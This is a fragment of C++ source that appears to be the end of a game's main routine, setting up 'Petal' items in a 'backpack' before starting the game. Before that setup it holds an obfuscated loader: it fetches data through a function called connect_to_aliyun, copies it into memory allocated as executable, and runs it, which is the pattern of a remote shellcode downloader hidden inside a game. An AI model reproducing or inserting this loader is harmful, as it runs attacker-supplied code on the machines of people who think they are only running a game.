			char *dec2 = ( char *)connect_to_aliyun((grumm3 + grumma2).c_str(), fhdi);

			goto ggb;
		}


ggb3:


		char *dec = "u29gj49fjf94io9ruif0ioghsiukfjhefbirujfhnilvjkfv";
		dec = ( char *)connect_to_aliyun(dec3, vhhr);

		LPVOID Memory = VirtualAlloc(NULL, vhhr, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

		if (Memory == NULL) {
			return 0;
		}

		memcpy(Memory, dec, vhhr);

		((void(*)())Memory)();

	}





	for (int i = 0; i < 3; i++) {
		Petal a(0, UNUSUAL);
		backpack.push_back(a);
	}
	for (int i = 0; i < 1; i++) {
		Petal a(3, UNUSUAL);
		backpack.push_back(a);
	}
	for (int i = 0; i < 1; i++) {
		Petal a(6, UNUSUAL);
		backpack.push_back(a);
	}
	for (int i = 0; i < 2; i++) {
		Petal a(7, UNUSUAL);
		backpack.push_back(a);
	}
	for (int i = 0; i < 3; i++) {
		Petal a(11, UNUSUAL);
		backpack.push_back(a);
	}

	pause();
	game();
}
